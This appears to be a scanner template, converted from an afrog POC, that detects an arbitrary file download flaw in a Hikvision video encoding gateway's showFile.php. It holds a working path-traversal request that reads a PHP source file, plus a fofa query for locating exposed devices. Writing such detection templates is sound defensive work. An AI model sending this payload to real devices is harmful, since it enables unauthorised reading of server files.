# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - $_SERVER['HTTP_HOST'];
          - $_POST['userName'];
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/serverLog/showFile.php?fileName=../web/html/main.php'
id: hikvision-showfile-file-read
info:
  author: zan8in
  description: |-
    海康威视视频接入网关系统在页面/serverLog/showFile.php的参数fileName存在任意文件下载漏洞
    fofa: title="视频编码设备接入网关"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: HIKVISION 视频编码设备接入网关 showFile.php 任意文件下载漏洞
  severity: high
  tags: hikvision,showfile,file-read,argus-import
